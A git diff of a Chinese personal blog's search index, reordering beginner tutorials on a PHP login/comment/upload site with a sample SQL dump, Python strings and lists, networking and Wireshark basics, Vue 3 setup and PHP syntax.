>&#98;&#x61;&#116;&#109;&#x61;&#110;&#x40;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (8, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x64;&#x68;&#97;&#x6b;&#x6b;&#97;&#110;&#46;&#99;&#111;&#109;" >&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x64;&#x68;&#97;&#x6b;&#x6b;&#97;&#110;&#46;&#99;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);</p>
-<hr>
-<p>– Table structure for referers</p>
-<hr>
-<p>DROP TABLE IF EXISTS <code>referers</code>;<br>CREATE TABLE <code>referers</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>referer</code> varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>ip_address</code> varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 1 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
-<hr>
-<p>– Table structure for uagents</p>
-<hr>
-<p>DROP TABLE IF EXISTS <code>uagents</code>;<br>CREATE TABLE <code>uagents</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>uagent</code> varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>ip_address</code> varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>username</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 1 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
-<hr>
-<p>– Table structure for users</p>
-<hr>
-<p>DROP TABLE IF EXISTS <code>users</code>;<br>CREATE TABLE <code>users</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>username</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  <code>password</code> varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 15 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
-<hr>
-<p>– Records of users</p>
-<hr>
-<p>INSERT INTO <code>users</code> VALUES (1, ‘Dumb’, ‘Dumb’);<br>INSERT INTO <code>users</code> VALUES (2, ‘Angelina’, ‘I-kill-you’);<br>INSERT INTO <code>users</code> VALUES (3, ‘Dummy’, ‘p@ssword’);<br>INSERT INTO <code>users</code> VALUES (4, ‘secure’, ‘crappy’);<br>INSERT INTO <code>users</code> VALUES (5, ‘stupid’, ‘stupidity’);<br>INSERT INTO <code>users</code> VALUES (6, ‘superman’, ‘genious’);<br>INSERT INTO <code>users</code> VALUES (7, ‘batman’, ‘mob!le’);<br>INSERT INTO <code>users</code> VALUES (8, ‘admin’, ‘admin’);<br>INSERT INTO <code>users</code> VALUES (9, ‘admin1’, ‘admin1’);<br>INSERT INTO <code>users</code> VALUES (10, ‘admin2’, ‘admin2’);<br>INSERT INTO <code>users</code> VALUES (11, ‘admin3’, ‘admin3’);<br>INSERT INTO <code>users</code> VALUES (12, ‘dhakkan’, ‘dumbo’);<br>INSERT INTO <code>users</code> VALUES (14, ‘admin4’, ‘admin4’);</p>
-<p>SET FOREIGN_KEY_CHECKS &#x3D; 1;</p>
-<p>并运行</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205054877.png" alt="image-20231212205054877"></p>
-<p>成功会有几个数据表</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205148156.png" alt="image-20231212205148156"></p>
-<p>6.在PHP study打开网站</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205319779.png" alt="image-20231212205319779"></p>
-<p>运行效果，输入表里面有点用户内容会跳转页面并有你输入是用户名，密码</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205455630.png" alt="image-20231212205455630"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205514607.png" alt="image-20231212205514607"></p>
-<p>7.新建一个zhuye.php文件实现主页注销登录功能代码如下</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213193715262.png" alt="image-20231213193715262"></p>
-<p>8.重新进行登录成功后进入运行效果如下，点击注销会立马返回登录页面</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213193809697.png" alt="image-20231213193809697"></p>
-<p>9.增加实现一个评论区页面功能，新建一个comment.php页面代码如下</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194244959.png" alt="image-20231213194244959"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194308902.png" alt="image-20231213194308902"></p>
-<p>10.进入127.0.0.1&#x2F;comment.php页面成功实现评论功能效果</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194516122.png" alt="image-20231213194516122"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194539713.png" alt="image-20231213194539713"></p>
-<p>11.增加实现一个上传文件功能的页面，新建一个upload.php页面代码如下</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213194834994.png" alt="image-20231213194834994"></p>
-<p>12.进入127.0.0.1&#x2F;upload.php页面成功实现上传文件功能效果</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195106958.png" alt="image-20231213195106958"></p>
-<p>13.将评论区功能和上传文件功能都集成给主页，需要给zhuye.php增加代码如下</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195421451.png" alt="image-20231213195421451"></p>
-<p>14.成功给登录成功后主页增加实现评论和上传文件功能</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231213195701712.png" alt="image-20231213195701712"></p>
+<p>索引值以 <strong>0</strong> 为开始值，**-1** 为从末尾的开始位置。</p>
+<p>实例如下：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204205436471.png" alt="image-20231204205436471"></p>
+<p>Python 的字符串的一些方法：</p>
+<p>1.upper()转换字符串中的小写字母为大写</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204210946961.png" alt="image-20231204210946961"></p>
+<p>2.strip()删除字符串2端的空格或指定字符</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204211039648.png" alt="image-20231204211039648"></p>
+<p>3.replace()字符串替换</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204211342982.png" alt="image-20231204211342982"></p>
+<p>4.split()对字符串进行切割</p>
+<p>5.join()拼接一个列表的内容成为新的字符串</p>
+<p>6.startswith()判断字符串是否以xxx开头</p>
+<p>7.len()字符串长度内置函数</p>
+<p>8.字符串的循环和遍历<br>for C in S:<br>print(c) 字符串中的每一个字符<br>关于in:<br>1.判断xxx是否在xxxx中出现了<br>2.for循环</p>
 ]]></content>
   </entry>
   <entry>
-    <title>Vue3</title>
-    <url>/2023/12/11/text13/</url>
+    <title>简单介绍上网流程，Proxifier代理设置，VMware桥接和nat模式，Wireshark</title>
+    <url>/2023/12/05/text8/</url>
     <content><![CDATA[
-        <h1 id="1-安装-Node-js-和-npm"   >
-          <a href="#1-安装-Node-js-和-npm" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装-Node-js-和-npm" class="headerlink" title="1. 安装 Node.js 和 npm"></a>1. 安装 Node.js 和 npm</h1>
-      <p>Vue 3 需要使用 Node.js 和 npm（Node 包管理器）进行开发。你可以从 <span class="exturl"><a class="exturl__link"   href="https://nodejs.org/" >Node.js 官网</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 下载并安装 Node.js，它自带了 npm。</p>
+        <h1 id="简单介绍上网流程"   >
+          <a href="#简单介绍上网流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单介绍上网流程" class="headerlink" title="简单介绍上网流程"></a>简单介绍上网流程</h1>
+      <p>1.通过dhcp（Dynamic Host Configuration Protocol，动态主机配置协议）获得私网的IP地址，使用　NAT（Network Address Translation，网络地址转换）多个私网IP通过一个公网ip进行上网。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205191559642.png" alt="image-20231205191559642"></p>
+<p>补充：私网地址范围（ A类地址:10.0.0.0<del>10.255.255.255 B类地址:172.16.0.0</del>172.31.255.255 C类地址:192.168.0.0~192.168.255.255）</p>
+<p>2.路由器里面有路由表分为静态路由，默认路由，动态路由，根据路由表来选择下一跳地址进行数据传输上网。</p>
 
-        <h1 id="2-创建Vue3项目"   >
-          <a href="#2-创建Vue3项目" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-创建Vue3项目" class="headerlink" title="2. 创建Vue3项目"></a>2. 创建Vue3项目</h1>
-      <p>打开cmd输入：npm create vue@latest</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203303662.png" alt="image-20231211203303662"></p>
-<p>在这个过程中，你会被要求选择一些配置选项，也可以全部否。</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203505764.png" alt="image-20231211203505764"></p>
+        <h1 id="Proxifier代理设置"   >
+          <a href="#Proxifier代理设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#Proxifier代理设置" class="headerlink" title="Proxifier代理设置"></a>Proxifier代理设置</h1>
+      <p>1.打开软件设置代理服务器</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192017805.png" alt="image-20231205192017805"></p>
+<p>2.对代理服务器进行配置</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192340743.png" alt="image-20231205192340743"></p>
+<p>3.设置代理规则来让什么网站和软件应用走代理</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192513853.png" alt="image-20231205192513853"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192541219.png" alt="image-20231205192541219"></p>
 
-        <h1 id="3-运行-Vue-3-项目"   >
-          <a href="#3-运行-Vue-3-项目" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-运行-Vue-3-项目" class="headerlink" title="3. 运行 Vue 3 项目"></a>3. 运行 Vue 3 项目</h1>
-      <p>进入项目目录：cd my-vue3-project</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203648100.png" alt="image-20231211203648100"></p>
-<p>安装element-plus服务：npm install element-plus –save<br>                                          npm install -D unplugin-vue-components unplugin-auto-import</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204258171.png" alt="image-20231211204258171"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204357218.png" alt="image-20231211204357218"></p>
-<p>然后运行项目：npm run dev</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204442485.png" alt="image-20231211204442485"></p>
-<p>这将启动一个开发服务器，并在浏览器中打开项目。你会看到一个页面，表示 Vue 3 项目已经成功运行。<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204521686.png" alt="image-20231211204521686"></p>
+        <h1 id="VMware桥接和nat模式"   >
+          <a href="#VMware桥接和nat模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#VMware桥接和nat模式" class="headerlink" title="VMware桥接和nat模式"></a>VMware桥接和nat模式</h1>
+      <p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192852447.png" alt="image-20231205192852447"></p>
 
-        <h1 id="4-项目结构"   >
-          <a href="#4-项目结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-项目结构" class="headerlink" title="4. 项目结构"></a>4. 项目结构</h1>
-      <p>Vue 3 项目的主要目录结构：</p>
-<ul>
-<li><code>src</code>: 包含项目的源代码</li>
-<li><code>public</code>: 静态资源文件，不经过 Webpack 处理</li>
-<li><code>node_modules</code>: 存放项目依赖的 npm 模块</li>
-<li><code>public/index.html</code>: 项目的入口 HTML 文件</li>
-<li><code>src/main.js</code>: 项目的入口 JavaScript 文件</li>
-<li><code>src/App.vue</code>: 根组件文件</li>
-<li><code>src/components</code>: 存放 Vue 组件的目录</li>
-<li><code>src/assets</code>: 存放静态资源如图片、样式文件等</li>
-<li><code>src/views</code>: 存放视图组件的目录</li>
-</ul>
-
-        <h1 id="5-在main-js中导入内容"   >
-          <a href="#5-在main-js中导入内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-在main-js中导入内容" class="headerlink" title="5.在main.js中导入内容"></a>5.在main.js中导入内容</h1>
-      <p>import { createApp } from ‘vue’<br>import App from ‘.&#x2F;App.vue’<br>import ElementPlus from ‘element-plus’;<br>import ‘element-plus&#x2F;dist&#x2F;index.css’</p>
-<p>createApp(App).mount(‘#app’)</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211210145215.png" alt="image-20231211210145215"></p>
-
-        <h1 id="6-vue简单编辑使用"   >
-          <a href="#6-vue简单编辑使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-vue简单编辑使用" class="headerlink" title="6.vue简单编辑使用"></a>6.vue简单编辑使用</h1>
-      <p>vue页面主要组成</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211210448817.png" alt="image-20231211210448817"></p>
-<p>可以从<span class="exturl"><a class="exturl__link"   href="https://element-plus.org/zh-CN/component/%E4%B8%8B%E8%BD%BD%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6" >https://element-plus.org/zh-CN/component/下载使用组件</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>一般引用如button按钮等等组件会有多个部分都需要放到对应位置</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217094056142.png" alt="image-20231217094056142"></p>
-<p>结合Container 布局容器，menu菜单侧栏，buttto按钮，switch开关等等可以写出下面</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217092600009.png" alt="image-20231217092600009"></p>
-<p>对应内容都要放到想要的容器布局里面</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217092751646.png" alt="image-20231217092751646"></p>
+        <h1 id="Wireshark"   >
+          <a href="#Wireshark" class="heading-link"><i class="fas fa-link"></i></a><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1>
+      <p>1.选择要流量监控的网络接口</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193234605.png" alt="image-20231205193234605"></p>
+<p>2.简单介绍部分意思</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193526589.png" alt="image-20231205193526589"></p>
+<p>3.输入过滤条件可以筛选需要监控的流量信息</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193657914.png" alt="image-20231205193657914"></p>
 ]]></content>
   </entry>
   <entry>
@@ -471,6 +445,36 @@
 <p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210172438749.png" alt="image-20231210172438749"></p>
 <p>5.字典的嵌套</p>
 <p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210172646960.png" alt="image-20231210172646960"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>python列表</title>
+    <url>/2023/12/05/text9/</url>
+    <content><![CDATA[<p>1.列表的定义：能装东西的东西在python中用[]来表示一个列表。列表中的元素通过,隔开。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191351741.png" alt="image-20231210191351741"></p>
+<p>2.列表的特性：有索引也有切片，索引超过范围会报错。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191509237.png" alt="image-20231210191509237"></p>
+<p>可以for循环遍历</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191605440.png" alt="image-20231210191605440"></p>
+<p>用len可以拿到列表长度</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191658201.png" alt="image-20231210191658201"></p>
+<p>3.列表的增删改查</p>
+<p>（1）列表数据的增加</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210192248026.png" alt="image-20231210192248026"></p>
+<p>（2）列表数据的删除</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210192825012.png" alt="image-20231210192825012"></p>
+<p>循环删除</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193135716.png" alt="image-20231210193135716"></p>
+<p>（3）列表数据的修改</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193422914.png" alt="image-20231210193422914"></p>
+<p>（4）列表数据的查询</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193506419.png" alt="image-20231210193506419"></p>
+<p>4.列表的循环</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210195147475.png" alt="image-20231210195147475"></p>
+<p>5.列表的其他操作</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210200132744.png" alt="image-20231210200132744"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210200030146.png" alt="image-20231210200030146"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210195930171.png" alt="image-20231210195930171"></p>
 ]]></content>
   </entry>
   <entry>
@@ -749,453 +753,449 @@
 ]]></content>
   </entry>
   <entry>
-    <title>python列表</title>
-    <url>/2023/12/05/text9/</url>
-    <content><![CDATA[<p>1.列表的定义：能装东西的东西在python中用[]来表示一个列表。列表中的元素通过,隔开。</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191351741.png" alt="image-20231210191351741"></p>
-<p>2.列表的特性：有索引也有切片，索引超过范围会报错。</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191509237.png" alt="image-20231210191509237"></p>
-<p>可以for循环遍历</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191605440.png" alt="image-20231210191605440"></p>
-<p>用len可以拿到列表长度</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191658201.png" alt="image-20231210191658201"></p>
-<p>3.列表的增删改查</p>
-<p>（1）列表数据的增加</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210192248026.png" alt="image-20231210192248026"></p>
-<p>（2）列表数据的删除</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210192825012.png" alt="image-20231210192825012"></p>
-<p>循环删除</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193135716.png" alt="image-20231210193135716"></p>
-<p>（3）列表数据的修改</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193422914.png" alt="image-20231210193422914"></p>
-<p>（4）列表数据的查询</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193506419.png" alt="image-20231210193506419"></p>
-<p>4.列表的循环</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210195147475.png" alt="image-20231210195147475"></p>
-<p>5.列表的其他操作</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210200132744.png" alt="image-20231210200132744"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210200030146.png" alt="image-20231210200030146"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210195930171.png" alt="image-20231210195930171"></p>
+    <title>Vue3</title>
+    <url>/2023/12/11/text13/</url>
+    <content><![CDATA[
+        <h1 id="1-安装-Node-js-和-npm"   >
+          <a href="#1-安装-Node-js-和-npm" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装-Node-js-和-npm" class="headerlink" title="1. 安装 Node.js 和 npm"></a>1. 安装 Node.js 和 npm</h1>
+      <p>Vue 3 需要使用 Node.js 和 npm（Node 包管理器）进行开发。你可以从 <span class="exturl"><a class="exturl__link"   href="https://nodejs.org/" >Node.js 官网</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 下载并安装 Node.js，它自带了 npm。</p>
+
+        <h1 id="2-创建Vue3项目"   >
+          <a href="#2-创建Vue3项目" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-创建Vue3项目" class="headerlink" title="2. 创建Vue3项目"></a>2. 创建Vue3项目</h1>
+      <p>打开cmd输入：npm create vue@latest</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203303662.png" alt="image-20231211203303662"></p>
+<p>在这个过程中，你会被要求选择一些配置选项，也可以全部否。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203505764.png" alt="image-20231211203505764"></p>
+
+        <h1 id="3-运行-Vue-3-项目"   >
+          <a href="#3-运行-Vue-3-项目" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-运行-Vue-3-项目" class="headerlink" title="3. 运行 Vue 3 项目"></a>3. 运行 Vue 3 项目</h1>
+      <p>进入项目目录：cd my-vue3-project</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211203648100.png" alt="image-20231211203648100"></p>
+<p>安装element-plus服务：npm install element-plus –save<br>                                          npm install -D unplugin-vue-components unplugin-auto-import</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204258171.png" alt="image-20231211204258171"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204357218.png" alt="image-20231211204357218"></p>
+<p>然后运行项目：npm run dev</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204442485.png" alt="image-20231211204442485"></p>
+<p>这将启动一个开发服务器，并在浏览器中打开项目。你会看到一个页面，表示 Vue 3 项目已经成功运行。<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211204521686.png" alt="image-20231211204521686"></p>
+
+        <h1 id="4-项目结构"   >
+          <a href="#4-项目结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-项目结构" class="headerlink" title="4. 项目结构"></a>4. 项目结构</h1>
+      <p>Vue 3 项目的主要目录结构：</p>
+<ul>
+<li><code>src</code>: 包含项目的源代码</li>
+<li><code>public</code>: 静态资源文件，不经过 Webpack 处理</li>
+<li><code>node_modules</code>: 存放项目依赖的 npm 模块</li>
+<li><code>public/index.html</code>: 项目的入口 HTML 文件</li>
+<li><code>src/main.js</code>: 项目的入口 JavaScript 文件</li>
+<li><code>src/App.vue</code>: 根组件文件</li>
+<li><code>src/components</code>: 存放 Vue 组件的目录</li>
+<li><code>src/assets</code>: 存放静态资源如图片、样式文件等</li>
+<li><code>src/views</code>: 存放视图组件的目录</li>
+</ul>
+
+        <h1 id="5-在main-js中导入内容"   >
+          <a href="#5-在main-js中导入内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-在main-js中导入内容" class="headerlink" title="5.在main.js中导入内容"></a>5.在main.js中导入内容</h1>
+      <p>import { createApp } from ‘vue’<br>import App from ‘.&#x2F;App.vue’<br>import ElementPlus from ‘element-plus’;<br>import ‘element-plus&#x2F;dist&#x2F;index.css’</p>
+<p>createApp(App).mount(‘#app’)</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211210145215.png" alt="image-20231211210145215"></p>
+
+        <h1 id="6-vue简单编辑使用"   >
+          <a href="#6-vue简单编辑使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-vue简单编辑使用" class="headerlink" title="6.vue简单编辑使用"></a>6.vue简单编辑使用</h1>
+      <p>vue页面主要组成</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231211210448817.png" alt="image-20231211210448817"></p>
+<p>可以从<span class="exturl"><a class="exturl__link"   href="https://element-plus.org/zh-CN/component/%E4%B8%8B%E8%BD%BD%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6" >https://element-plus.org/zh-CN/component/下载使用组件</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>一般引用如button按钮等等组件会有多个部分都需要放到对应位置</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217094056142.png" alt="image-20231217094056142"></p>
+<p>结合Container 布局容器，menu菜单侧栏，buttto按钮，switch开关等等可以写出下面</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217092600009.png" alt="image-20231217092600009"></p>
+<p>对应内容都要放到想要的容器布局里面</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217092751646.png" alt="image-20231217092751646"></p>
 ]]></content>
   </entry>
   <entry>
-    <title>简单介绍上网流程，Proxifier代理设置，VMware桥接和nat模式，Wireshark</title>
-    <url>/2023/12/05/text8/</url>
+    <title>PHP</title>
+    <url>/2023/12/12/text15/</url>
     <content><![CDATA[
-        <h1 id="简单介绍上网流程"   >
-          <a href="#简单介绍上网流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单介绍上网流程" class="headerlink" title="简单介绍上网流程"></a>简单介绍上网流程</h1>
-      <p>1.通过dhcp（Dynamic Host Configuration Protocol，动态主机配置协议）获得私网的IP地址，使用　NAT（Network Address Translation，网络地址转换）多个私网IP通过一个公网ip进行上网。</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205191559642.png" alt="image-20231205191559642"></p>
-<p>补充：私网地址范围（ A类地址:10.0.0.0<del>10.255.255.255 B类地址:172.16.0.0</del>172.31.255.255 C类地址:192.168.0.0~192.168.255.255）</p>
-<p>2.路由器里面有路由表分为静态路由，默认路由，动态路由，根据路由表来选择下一跳地址进行数据传输上网。</p>
+        <h1 id="1-PHP简介"   >
+          <a href="#1-PHP简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP简介" class="headerlink" title="1.PHP简介"></a>1.PHP简介</h1>
+      <p>  PHP （全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言,是服务器端脚本语言。PHP 脚本在服务器上执行。</p>
+<ul>
+<li><p>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</p>
+</li>
+<li><p>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</p>
+</li>
+<li><p>PHP 文件的默认文件扩展名是 <strong>.php</strong>。</p>
+</li>
+<li><p>PHP 可以生成动态页面内容</p>
+</li>
+<li><p>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</p>
+</li>
+<li><p>PHP 可以收集表单数据</p>
+</li>
+<li><p>PHP 可以发送和接收 cookies</p>
+</li>
+<li><p>PHP 可以添加、删除、修改您的数据库中的数据</p>
+</li>
+<li><p>PHP 可以限制用户访问您的网站上的一些页面</p>
+</li>
+<li><p>PHP 可以加密数据</p>
+</li>
+</ul>
 
-        <h1 id="Proxifier代理设置"   >
-          <a href="#Proxifier代理设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#Proxifier代理设置" class="headerlink" title="Proxifier代理设置"></a>Proxifier代理设置</h1>
-      <p>1.打开软件设置代理服务器</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192017805.png" alt="image-20231205192017805"></p>
-<p>2.对代理服务器进行配置</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192340743.png" alt="image-20231205192340743"></p>
-<p>3.设置代理规则来让什么网站和软件应用走代理</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192513853.png" alt="image-20231205192513853"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192541219.png" alt="image-20231205192541219"></p>
+        <h2 id="基本的-PHP-语法"   >
+          <a href="#基本的-PHP-语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本的-PHP-语法" class="headerlink" title="基本的 PHP 语法"></a>基本的 PHP 语法</h2>
+      <p>PHP 脚本可以放在文档中的任何位置。</p>
+<p>PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// PHP 代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
 
-        <h1 id="VMware桥接和nat模式"   >
-          <a href="#VMware桥接和nat模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#VMware桥接和nat模式" class="headerlink" title="VMware桥接和nat模式"></a>VMware桥接和nat模式</h1>
-      <p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192852447.png" alt="image-20231205192852447"></p>
+<p>在 PHP 中，只有一个字符串运算符并置运算符 (.) 用于把两个字符串值连接起来。</p>
